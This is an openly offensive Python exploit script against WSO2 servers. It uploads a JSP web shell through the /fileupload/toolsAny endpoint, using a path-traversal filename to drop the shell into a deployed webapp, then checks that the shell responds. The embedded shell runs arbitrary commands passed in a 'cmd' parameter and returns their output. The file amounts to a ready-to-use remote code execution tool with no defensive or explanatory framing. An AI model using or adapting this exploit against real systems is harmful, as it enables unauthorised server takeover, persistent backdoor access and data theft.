# /bin/bash/env python3
# _*_coding:utf-8_*_

import os
import re
import sys
import time
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA: "WSO2"')


def run_proto(url):
    exploit_url = url + "/fileupload/toolsAny"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0"
    }
    shell_name = str(time.time()) + '.jsp'
    payload = '''<%@ page import="java.util.*,java.io.*"%>
<html>
<body>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
        if (request.getParameter("cmd") != null ) {
            out.println("Command: " + request.getParameter("cmd") + "<BR>");
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(request.getParameter("cmd"));
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    %>
    </pre>
</body>
</html>'''

    check_url = url + "/authenticationendpoint/{}".format(shell_name)
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        session = requests.session()
        files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{shell_name}".format(shell_name=shell_name): payload}
        session.post(url=exploit_url, headers=headers, files=files, verify=False, timeout=(6, 6), allow_redirects=False,
                     proxies=None)
        session.get(url=url, headers=headers, files=files, verify=False, timeout=(6, 6), allow_redirects=False,
                     proxies=None)
        resp = session.get(url=check_url, headers=headers, verify=False, timeout=(6, 6), allow_redirects=False, proxies=None)
        if resp.status_code == 200:
            print(check_url + ' exist')
            return True
        else:
            return False

    except Exception as e:
        print(e)
        print('1')
        return False



def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = int(target.split(':')[1])
    result = run(ip, port)

    if result:
        print("Exist")
    else:
        print("UnExist")
